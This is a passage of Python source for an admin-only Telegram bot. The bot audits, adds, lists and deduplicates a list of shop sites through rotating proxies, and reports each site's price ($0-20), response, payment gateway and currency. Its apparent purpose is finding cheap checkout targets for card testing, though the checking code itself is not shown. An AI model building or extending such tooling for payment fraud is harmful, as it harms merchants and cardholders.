    file_content = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    file_content += f"TOTAL CHECKED: {total_sites}\n"
    file_content += f"WORKING SITES (Price $0-20): {len(final_unique_sites)}\n"
    file_content += f"REJECTED (Dead/High Price): {dead_count}\n"
    if rate_limited_count > 0:
        file_content += f"RATE LIMITED (429 — unverified): {rate_limited_count}\n"
    if duplicate_count > 0 or removed_dupes > 0:
        file_content += f"DUPLICATES SKIPPED: {duplicate_count + removed_dupes}\n"
    file_content += f"PROXIES USED: {len(PROXY_LIST)} | BAD: {len(BAD_PROXIES)}\n"
    file_content += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"

    if working_sites_content:
        file_content += "\n".join(working_sites_content)
    else:
        file_content += "No valid sites found within price range!"

    try:
        def _write_report():
            with open(filename, "w", encoding="utf-8") as f:
                f.write(file_content)

        await asyncio.to_thread(_write_report)

        if status_message_id:
            try:
                dup_final = ""
                if (duplicate_count + removed_dupes) > 0:
                    dup_final = f"\n🚫 <b>Duplicates Blocked:</b> <code>{duplicate_count + removed_dupes}</code>"
                rate_final = ""
                if rate_limited_count > 0:
                    rate_final = f"\n⏳ <b>Rate Limited (429):</b> <code>{rate_limited_count}</code>"

                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=status_message_id,
                    text=f"✅ <b>{command_name} Complete!</b>\n\n"
                    f"<b>Total Checked:</b> {total_sites}\n"
                    f"<b>Valid ($0-20):</b> {len(final_unique_sites)} ✅\n"
                    f"<b>Rejected:</b> {dead_count} ❌\n"
                    f"<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n"
                    f"<tg-emoji emoji-id=\"5447602197439218445\">🌐</tg-emoji> <b>Proxies Used:</b> {len(PROXY_LIST)} | <b>Bad:</b> {len(BAD_PROXIES)}"
                    f"{rate_final}{dup_final}",
                    parse_mode="HTML"
                )
            except Exception as e:
                print(f"[ERROR] Failed to edit final status: {e}")
                pass

        await bot.send_document(
            chat_id=chat_id,
            document=FSInputFile(filename),
            caption=f"📜 <b>{command_name} Report (Deduplicated)</b>\n"
                   f"<b>Format:</b> Site | Price | Response | Gateway | Currency",
            parse_mode="HTML"
        )

        try:
            os.remove(filename)
        except Exception:
            pass

    except Exception as e:
        await bot.send_message(chat_id=chat_id, text=f"❌ <b>Error:</b> {e}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# COMMAND 1: /checksite (Audit & Clean Sites)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(Command("checksite"))
async def checksite_command(message: types.Message):
    """Audit existing sites - removes dead ones and deduplicates"""
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer("⛔ <b>You are not authorized.</b>", parse_mode="HTML")
        return

    bot = message.bot
    chat_id = message.chat.id

    sites = await asyncio.to_thread(read_sites)
    if not sites:
        await message.answer("📭 <b>No sites found in sites.txt</b>", parse_mode="HTML")
        return

    status_msg = await message.answer(
        f"<tg-emoji emoji-id=\"4949560993840629085\">😅</tg-emoji> <b>Starting Audit on {len(sites)} Sites...</b>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"<tg-emoji emoji-id=\"5850526539904453814\">🔘</tg-emoji> <b>Checked:</b> <code>0/{len(sites)}</code>\n"
        f"<tg-emoji emoji-id=\"6082192961272027437\">☑️</tg-emoji> <b>Kept ($0-20):</b> <code>0</code>\n"
        f"<tg-emoji emoji-id=\"5116151848855667552\">🚫</tg-emoji> <b>Rejected:</b> <code>0</code>\n"
        f"<tg-emoji emoji-id=\"5447602197439218445\">🌐</tg-emoji> <b>Proxies:</b> <code>{len(PROXY_LIST)}</code>",
        parse_mode="HTML"
    )

    asyncio.create_task(
        run_site_checker(
            bot,
            chat_id,
            sites,
            command_name="Audit",
            status_message_id=status_msg.message_id
        )
    )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# COMMAND 2: /seturl (Add & Verify New Sites)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(Command("seturl"))
async def seturl_command(message: types.Message):
    """Add new sites from uploaded file - automatically skips duplicates"""
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer("⛔ <b>You are not authorized.</b>", parse_mode="HTML")
        return

    bot = message.bot
    chat_id = message.chat.id

    doc = message.document
    if not doc:
        if message.reply_to_message:
            doc = message.reply_to_message.document

    if not doc:
        await message.answer(
            "⚠️ <b>Please reply to a file or upload a file containing sites with /seturl.</b>",
            parse_mode="HTML"
        )
        return

    try:
        file_info = await bot.get_file(doc.file_id)

        destination = io.BytesIO()
        await bot.download_file(file_info.file_path, destination)

        destination.seek(0)
        byte_content = destination.read()
        text = byte_content.decode('utf-8', errors='ignore')

        url_pattern = r'(https?://\S+)'
        new_sites = []
        lines = text.split('\n')

        for line in lines:
            match = re.search(url_pattern, line)
            if match:
                url = match.group(1)
                url = url.rstrip('.,;:!?)\'"')
                new_sites.append(url)

        new_sites = list(set(new_sites))

        if not new_sites:
            await message.answer("❌ <b>No valid sites found in file.</b>", parse_mode="HTML")
            return

    except Exception as e:
        logging.error(f"Error downloading file: {e}", exc_info=True)
        await message.answer(f"❌ <b>Error reading file:</b> {e}", parse_mode="HTML")
        return

    status_msg = await message.answer(
        f"<tg-emoji emoji-id=\"4949560993840629085\">😅</tg-emoji> <b>Starting Addition of {len(new_sites)} Sites...</b>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"<tg-emoji emoji-id=\"5850526539904453814\">🔘</tg-emoji> <b>Checked:</b> <code>0/{len(new_sites)}</code>\n"
        f"<tg-emoji emoji-id=\"6082192961272027437\">☑️</tg-emoji> <b>Added ($0-20):</b> <code>0</code>\n"
        f"<tg-emoji emoji-id=\"5116151848855667552\">🚫</tg-emoji> <b>Rejected:</b> <code>0</code>\n"
        f"<tg-emoji emoji-id=\"6136172917702008149\">👌</tg-emoji> <b>Duplicates:</b> <code>0</code>\n"
        f"<tg-emoji emoji-id=\"5447602197439218445\">🌐</tg-emoji> <b>Proxies:</b> <code>{len(PROXY_LIST)}</code>",
        parse_mode="HTML"
    )

    asyncio.create_task(
        run_site_checker(
            bot,
            chat_id,
            new_sites,
            command_name="Adding",
            status_message_id=status_msg.message_id
        )
    )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# COMMAND 3: /siteall (List All Sites)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(Command("siteall"))
async def siteall_command(message: types.Message):
    """Download full list of all sites (automatically deduplicated)"""
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer("⛔ <b>You are not authorized.</b>", parse_mode="HTML")
        return

    sites = await asyncio.to_thread(read_sites)
    if not sites:
        await message.answer("📭 <b>sites.txt is empty.</b>", parse_mode="HTML")
        return

    filename = f"full_sites_list_{int(time.time())}.txt"

    try:
        def _write_file():
            with open(filename, "w", encoding="utf-8") as f:
                f.write(f"Total Sites: {len(sites)} (Deduplicated)\n\n")
                f.write("\n".join(sites))

        await asyncio.to_thread(_write_file)

        await message.answer_document(
            document=FSInputFile(filename),
            caption=f"📜 <b>Total Sites:</b> <code>{len(sites)}</code> ✨ (No Duplicates)",
            parse_mode="HTML"
        )
        os.remove(filename)
    except Exception as e:
        await message.answer(f"❌ <b>Error:</b> {e}", parse_mode="HTML")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# COMMAND 4: /removeall (Remove All Sites)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(Command("removeall"))
async def removeall_command(message: types.Message):
    """Clear all sites from sites.txt"""
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer("⛔ <b>You are not authorized.</b>", parse_mode="HTML")
        return

    sites = await asyncio.to_thread(read_sites)
    if not sites:
        await message.answer("📭 <b>sites.txt is already empty.</b>", parse_mode="HTML")
        return

    try:
        def _clear_file():
            with open("sites.txt", "w", encoding="utf-8") as f:
                pass

        await asyncio.to_thread(_clear_file)

        await message.answer(
            f"✅ <b>All sites have been successfully removed.</b>\n\n"
            f"<b>Removed:</b> <code>{len(sites)}</code> sites",
            parse_mode="HTML"
        )
    except Exception as e:
        await message.answer(f"❌ <b>Error:</b> {e}", parse_mode="HTML")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# COMMAND 5: /dedupe (Force Deduplicate)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(Command("dedupe"))
async def dedupe_command(message: types.Message):
    """Force deduplicate sites.txt"""
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer("⛔ <b>You are not authorized.</b>", parse_mode="HTML")
        return

    sites = await asyncio.to_thread(read_sites)

    if not sites:
        await message.answer("📭 <b>sites.txt is empty.</b>", parse_mode="HTML")
        return

    original_count = len(sites)
    final_count = await asyncio.to_thread(write_sites, sites)
    removed = original_count - final_count

    if removed > 0:
        await message.answer(
            f"✨ <b>Deduplication Complete!</b>\n\n"
            f"<b>Original:</b> <code>{original_count}</code>\n"
            f"<b>Removed:</b> <code>{removed}</code> duplicates\n"
            f"<b>Final:</b> <code>{final_count}</code> unique sites",
            parse_mode="HTML"
        )
    else:
        await message.answer(
            f"✅ <b>No duplicates found!</b>\n\n"
            f"<b>Total Sites:</b> <code>{final_count}</code> (All Unique)",
            parse_mode="HTML"
        )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# COMMAND 6: /proxyinfo (Check Proxy Status)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(Command("proxyinfo"))
async def proxyinfo_command(message: types.Message):
    """Show proxy statistics"""
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer("⛔ <b>You are not authorized.</b>", parse_mode="HTML")
        return

    available = len(PROXY_LIST) - len(BAD_PROXIES)

    text = (
        f"🌐 <b>Proxy Information</b>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"📊 <b>Total Proxies:</b> <code>{len(PROXY_LIST)}</code>\n"
        f"✅ <b>Available:</b> <code>{available}</code>\n"
        f"❌ <b>Bad/Dead:</b> <code>{len(BAD_PROXIES)}</code>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
    )

    for i, proxy in enumerate(PROXY_LIST, 1):
        status = "❌ Dead" if proxy in BAD_PROXIES else "✅ Live"
        if "@" in proxy:
            parts = proxy.split("@")
            host_part = parts[1] if len(parts) > 1 else proxy
            text += f"<code>{i}.</code> {host_part} - {status}\n"
        else:
            text += f"<code>{i}.</code> {proxy[:30]}... - {status}\n"

    await message.answer(text, parse_mode="HTML")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# COMMAND 7: /resetproxy (Reset Bad Proxies)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(Command("resetproxy"))
async def resetproxy_command(message: types.Message):
    """Reset all bad proxies back to available"""
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer("⛔ <b>You are not authorized.</b>", parse_mode="HTML")
        return

    global BAD_PROXIES
    cleared_count = len(BAD_PROXIES)
    BAD_PROXIES.clear()

    await message.answer(
        f"✅ <b>Proxy List Reset!</b>\n\n"
        f"<b>Cleared:</b> <code>{cleared_count}</code> bad proxies\n"
        f"<b>Available Now:</b> <code>{len(PROXY_LIST)}</code>",
        parse_mode="HTML"
    )
